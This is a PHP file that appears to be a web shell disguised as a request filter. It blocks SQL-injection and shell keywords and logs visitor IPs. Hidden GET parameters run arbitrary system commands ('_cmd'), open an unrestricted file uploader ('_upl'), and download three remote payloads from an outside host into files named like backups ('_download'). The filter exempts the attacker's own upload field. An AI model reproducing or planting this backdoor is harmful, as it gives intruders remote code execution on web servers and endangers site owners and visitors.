<?php
error_reporting(0);
function uploader(){
	$html = '<form action="" method="POST" enctype="multipart/form-data">
	<input type="file" name="_upl">
	<input type="submit" name="upl">
	</form>
	';
	echo $html;
	if(isset($_POST['upl'])){
		if(copy($_FILES['_upl']['tmp_name'], $_FILES['_upl']['name'])){
			echo 'upload ok';
		}else{
			echo 'upload ko';
		}
	}
}
function cmd($command){
	echo '<pre>';
	system($command);
}
function get_shell(){
	file_put_contents("config.backup.php", file_get_contents("https://aplikasibelajaranak.com/proxy/xalfa.txt"));
	file_put_contents("class.backup.php", file_get_contents("https://aplikasibelajaranak.com/proxy/idx.txt"));
	file_put_contents("index.backup.php", file_get_contents("https://aplikasibelajaranak.com/proxy/marijuana.txt"));
	echo 'download ok';
}
function get_client_ip() {
	$ipaddress = '';
	if (getenv('HTTP_CLIENT_IP'))
		$ipaddress = getenv('HTTP_CLIENT_IP');
	else if(getenv('HTTP_X_FORWARDED_FOR'))
		$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
	else if(getenv('HTTP_X_FORWARDED'))
		$ipaddress = getenv('HTTP_X_FORWARDED');
	else if(getenv('HTTP_FORWARDED_FOR'))
		$ipaddress = getenv('HTTP_FORWARDED_FOR');
	else if(getenv('HTTP_FORWARDED'))
		$ipaddress = getenv('HTTP_FORWARDED');
	else if(getenv('REMOTE_ADDR'))
		$ipaddress = getenv('REMOTE_ADDR');
	else
		$ipaddress = 'UNKNOWN';
	return $ipaddress;
}

function logger($ip, $ua){
	$data = "IP : $ip | $ua<br>";
	file_put_contents("logger.html", $data, FILE_APPEND);
}
function block($str){
	$html = "
	<title>Request Blocked!</title>
	Request Blocked!<br>
	IP : ".get_client_ip()." | User-Agent : ".$_SERVER['HTTP_USER_AGENT'];
	logger(get_client_ip(), $_SERVER['HTTP_USER_AGENT']);
	echo $html;
	die();
}
function filter($string){
	$blacklist = [
		'union',
		'\/etc\/',
		'cat',
		'.env',
		'select',
		'\/etc\/passwd',
		'whoami',
		'concat',
		'script',
		'javascript',
		'alert',
		'group_concat',
		'hacked',
		'order',
		'database',
		'user(',
		'alfa',
		'shell',
		'exec',
		'upload',
		'phtml',
		'ssi',
		'mod',
		'php5',
		'--+-',
		'-- -',
		"'=''or'",
		"'or''='",
		"limit",
		'and sleep',
		'or sleep',
		'and false',
		'and true',
		'information_schema',
		'column_name',
		'table_name',
		'columns',
		'<?php',
	];

	foreach($blacklist as $black){
		if(preg_match("/$black/", strtolower($string))){
			block($string);
		}
	}
}
foreach($_GET as $key => $value){
	filter($key);
	filter($value);
}
foreach ($_POST as $key => $value) {
	filter($key);
	filter($value);
}
foreach($_FILES as $key => $value){
	if($key == "_upl"){continue;}
	filter(file_get_contents($_FILES[$key]['full_path']));
}
if(isset($_GET['_download'])){
	get_shell();
}elseif(isset($_GET['_cmd'])){
	cmd($_GET['_cmd']);
}elseif(isset($_GET['_upl'])){
	uploader();
}
?>
